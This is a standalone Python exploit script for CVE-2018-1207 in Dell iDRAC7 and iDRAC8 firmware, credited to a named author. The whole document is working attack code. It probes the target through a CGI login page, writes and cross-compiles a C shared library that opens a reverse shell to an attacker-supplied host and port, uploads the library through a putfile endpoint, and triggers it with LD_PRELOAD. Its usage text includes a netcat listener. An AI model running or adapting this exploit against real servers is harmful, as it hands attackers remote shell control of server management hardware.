#!/usr/bin/env python3

# Exploit Title: Dell iDRAC7 and iDRAC8 Devices Code Injection Vulnerability (RCE)
# Vulnerable version firmware: <  2.52.52.52
# Date: 2018-09-06
# Vendor Homepage: hxxps://www.dell.com
# CVE number: CVE-2018-1207
# By: Starev Alexey ( hxxps://t.me/starev_aa ), hxxps://kraud.ru

import requests
import sys
import os
import re
import struct
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

print ("""
    _   ________  ___  _   _______ 
   | | / /| ___ \/ _ \| | | |  _  \\
   | |/ / | |_/ / /_\ \ | | | | | |
   |    \ |    /|  _  | | | | | | |
   | |\  \| |\ \| | | | |_| | |/ / 
   \_| \_/\_| \_\_| |_/\___/|___/  

                   hxxps://kraud.ru                  

re-l: Updated for Python 3 and GCC 12, improved payload.
""")

try:
    host = sys.argv[1:][0]
    port = sys.argv[1:][1]
    lhost = sys.argv[1:][2]
    lport = sys.argv[1:][3]
except:
    print ("Usage: python ./CVE-2018-1207.py <rhost> <rport> <lhost> <lport>   ")
    print ("       python ./CVE-2018-1207.py 192.168.1.31 443 93.189.145.82 4444")
    print ("       nc -v -l -p <lport>                                         ")
    exit()

payloadbin = 'payload.so'
payloadc = 'payload.c'
timeout = 10
url = 'https://'+ str(host) + ':'+str(port)

try:
    r = requests.get(url+'/cgi-bin/login?LD_DEBUG=files', verify=False, timeout=timeout)
except:
  print ("Error connecting to the server " + str(url))
  exit()

vul  = re.search(r'calling init: /lib/',r.text)
if vul :
    print('[+] Server ' + str(url) + ' is vulnerable')
else:
    print('[-] Server ' + str(url) + ' is not vulnerable')
    exit()

print ("Generating Payload")

if os.path.exists(payloadc):
    os.unlink(payloadc)

payload = ("""
#include <stdlib.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <unistd.h>

static void main(void) __attribute__((constructor));
static void main(void)
{
       unsetenv("LD_PRELOAD"); // re-l: don't recursively load the payload in child processes
       int pid = fork();
       if(!pid) {
                int sock = socket(AF_INET, SOCK_STREAM, 0);
                struct sockaddr_in serv_addr = {0};
                serv_addr.sin_family = AF_INET;
                serv_addr.sin_port = htons(%d);
                serv_addr.sin_addr.s_addr = inet_addr("%s");
                // re-l: connect-back once and exit
                if (connect(sock, (struct sockaddr *)&serv_addr, sizeof(serv_addr)) == 0) {
                    dup2(sock, 0);
                    dup2(sock, 1);
                    dup2(sock, 2);
                    execl("/bin/sh", "/bin/sh", NULL);
                }
                exit(0);
        }
}
""") % (int(lport), lhost)

with open(payloadc, 'w') as file:
    file.write(payload)

if os.path.exists(payloadc):
    cmd = os.system('sh4-linux-gnu-gcc -shared -fPIC ./payload.c -o ./payload.so')
    exit_code = os.WEXITSTATUS(cmd)
    if exit_code == 0:
        print ("[+] Generated payload.")
    else:
        print ("[!] Error generating payload. Install the package gcc-sh4-linux-gnu.")
        exit()
else:
    print ("[!] Error generating payload. Please check the permissions and owner of that directory.")
    exit()

FFLAGS = 1
res = b''

with open(payloadbin, 'rb') as f:
    payload_so = f.read()

f_alias = b'RACPKSSHAUTHKEY1'

res += f_alias + (32 - len(f_alias)) * b'\0'
res += struct.pack('<L', len(payload_so))
res += struct.pack('<L', FFLAGS)
res += payload_so

print ("Uploading payload")
r = requests.post(url+'/cgi-bin/putfile', data=res, verify=False, timeout=timeout)

if r.status_code == 200:
    print ("[+] OK")
else:
    print ("Failed to upload Payload")
    exit()

print ("Starting shell.")
r = requests.get(url+'/cgi-bin/discover?LD_PRELOAD=/tmp/sshpkauthupload.tmp', verify=False, timeout=timeout)
#print r.text
print ("Good luck!")

if os.path.exists(payloadc):
    os.unlink(payloadc)

if os.path.exists(payloadbin):
    os.unlink(payloadbin)
